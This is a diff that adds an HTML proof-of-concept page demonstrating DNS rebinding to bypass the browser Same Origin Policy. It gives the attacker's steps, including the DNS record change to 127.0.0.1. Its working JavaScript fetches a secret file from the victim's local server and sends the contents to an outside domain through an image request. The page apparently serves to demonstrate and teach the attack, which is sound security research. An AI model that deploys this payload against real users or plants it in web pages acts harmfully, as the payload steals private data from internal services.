@@ -1,0 +1,81 @@
+<html>
+<head>
+	<link rel="stylesheet" type="text/css" href="">
+	<style>
+	    tab { padding-left: 4em; }
+	</style>
+</head>
+    <body>
+        <h2>PoC - Bypass Some Origin Policy explained version</h2>
+
+        <p>
+        	<b>Goal :</b> retrieve a file on a private server <a href="http://127.0.0.1/secret.txt">http://127.0.0.1/secret.txt</a> <br>
+        	This normaly should by impossible due to <a href="https://en.wikipedia.org/wiki/Same-origin_policy">Same Origin Policy</a> but we will use <a href="https://en.wikipedia.org/wiki/DNS_rebinding">DNS-rebinding</a> attack to bypass the SOP and retreive the file.</a> <br> <br>
+        	You can find more information by reading the readme.md on the github repository <a href="https://github.com/mpgn/BY-SOP/">BY-SOP</a>.
+        </p>
+
+        <h4>Victim's actions:</h4>
+        <ul>
+        	<li>visite a "malicious" page on a domain controlled by the attacker for few minutes <b>IMPORTANT</b></li>
+        	<li>the attaquant stole the secret file by changing the dns of the  malicious domain with the targeted IP...</li>
+        </ul>
+
+        <h4>Attacker's actions:</h4>
+        <ul>
+        	<p>We assume in this part, you know the victim is browsing your malicious page for at least 3 minutes</p>
+        	<li>
+        		1 - Change the DNS Ip <br>
+        			<tab></tab><code>your actual DNS record => foo.example.com.	59	IN	A	5.135.66.45</code><br >
+        			<tab></tab><code>your new    DNS record => foo.example.com.	59	IN	A	127.0.0.1</code><br >
+
+        	</li>
+        	<li>2 - Wait few minutes, the DNS need to be propagated ! (you can ping the url to check when the IP change)</li>
+        	<li>3 - Click to generate the request <button onclick="SOP_bypass()">send</button> (could be also a timer...)</li>
+        	<li>4 - Check the result in the file save.txt !</li>
+        </ul>
+
+        <h4>Contributor</h4>
+        <p>Martial Puygrenier - martial.puygrenier[A]gmail[DOT]com - 2016 - Github <a href="https://github.com/mpgn/BY-SOP/">BY-SOP</a></p>
+
+        <h4>References</h4>
+        <p>Check the readme <a href="https://github.com/mpgn/B-SOP/readme.md">references</a></p>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.min.js"></script>
+        <script type="text/javascript">
+
+    	    window.onload =  function(){
+    	        SOP_active();
+    	        console.log("time to change the dns IP...")
+    	    };
+
+    	    /*
+    	    	Example of Same Origin Policy error : 
+
+    			XMLHttpRequest cannot load http://127.0.0.1/secret.txt. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://ctf.mpgn.fr' is therefore not allowed access.
+    	    */
+    	    function SOP_active() {
+    	        $.get('http://127.0.0.1/secret.txt', function(data) {
+    	        });
+    	    }
+
+            /*
+                Bypass Same Origin Policy with DNS-rebinding
+
+                The request works like a charm once you modify the DNS IP with the IP targeted
+                Wait few minutes because the DNS need to be propagate ~2-3 min (Cloudflare ~3min because TTL min is 120s)
+                Then I send the result to another domain i own.
+
+                To send the result the victim can click on a link or we can use a timercallback.
+                I use the button in the demo
+            */
+    	    function SOP_bypass() {
+    	    	console.log("send request...")
+    	        $.get('/secret.txt', function(data) {
+    	            console.log(data);
+    	            var image = new Image();
+    	            image.src='http://mpgn.fr/flag.php?'+data;
+    	        });
+    	    }
+        </script>
+    </body>
+</html>
